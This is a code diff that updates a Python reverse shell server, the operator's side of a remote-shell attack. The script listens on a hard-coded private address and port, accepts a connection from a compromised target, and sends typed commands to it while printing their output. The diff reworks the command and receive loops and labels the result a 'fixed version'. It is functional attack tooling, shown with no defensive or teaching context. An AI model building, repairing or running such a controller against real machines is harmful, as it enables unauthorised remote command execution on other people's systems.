@@ -3,14 +3,8 @@ import socket
 import sys
 import threading
 import os
-import subprocess
 
 def start_server(host='192.168.1.110', port=9001):
-    """
-    Start reverse shell server
-    Use 192.168.1.110 for WiFi connections
-    Use 172.17.144.1 for WSL connections
-    """
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
@@ -20,40 +14,59 @@ def start_server(host='192.168.1.110', port=9001):
         print(f"[*] Listening on {host}:{port}")
         print(f"[*] Target should connect to: {host}:{port}")
     except Exception as e:
-        print(f"[!] Failed to bind to {host}:{port}")
-        print(f"[!] Error: {e}")
-        print("\n[*] Trying alternative IPs...")
-        print("[*] If on same WiFi, target should connect to: 192.168.1.110:9001")
-        print("[*] If in WSL, target should connect to: 172.17.144.1:9001")
+        print(f"[!] Failed to bind: {e}")
         sys.exit(1)
     
     client_socket, client_addr = server.accept()
     print(f"[+] Connection from {client_addr[0]}:{client_addr[1]}")
     
     try:
+        # Set socket to non-blocking to check for data
+        client_socket.setblocking(True)
+        
         while True:
-            command = input("shell> ")
+            # Print prompt
+            sys.stdout.write("shell> ")
+            sys.stdout.flush()
             
-            if command.lower() == 'exit':
-                client_socket.send(b'exit')
+            # Get command from user
+            command = sys.stdin.readline().strip()
+            
+            if command.lower() == 'exit' or command.lower() == 'quit':
+                client_socket.send(b'exit\n')
                 break
-            elif command.lower() == 'quit':
-                break
-            elif command.strip() == '':
+            elif command == '':
                 continue
-            else:
-                client_socket.send(command.encode())
-                
-                # Receive and display output
-                while True:
-                    try:
-                        output = client_socket.recv(4096).decode(errors='ignore')
-                        if not output:
-                            break
-                        print(output, end='')
-                    except:
+            
+            # Send command with newline
+            client_socket.send((command + '\n').encode())
+            
+            # Receive and display output
+            print("[+] Waiting for response...")
+            output_received = False
+            
+            while True:
+                try:
+                    # Receive data
+                    data = client_socket.recv(4096)
+                    if not data:
                         break
                     
+                    decoded = data.decode(errors='ignore')
+                    sys.stdout.write(decoded)
+                    sys.stdout.flush()
+                    
+                    # If we see the prompt marker or empty response, break
+                    if '] $' in decoded or len(data) < 4096:
+                        output_received = True
+                        break
+                        
+                except socket.timeout:
+                    if output_received:
+                        break
+                except:
+                    break
+            
     except KeyboardInterrupt:
         print("\n[!] Interrupted by user")
     except Exception as e:
@@ -65,7 +78,7 @@ def start_server(host='192.168.1.110', port=9001):
 
 if __name__ == "__main__":
     print("="*50)
-    print("REVERSE SHELL SERVER")
+    print("REVERSE SHELL SERVER (FIXED VERSION)")
     print("="*50)
     print("Your IP addresses:")
     print("  WiFi:      192.168.1.110  (for other computers on same WiFi)")
@@ -79,7 +92,6 @@ if __name__ == "__main__":
         host = sys.argv[1]
         port = 9001
     else:
-        # Default to WiFi IP
         host = '192.168.1.110'
         port = 9001
     
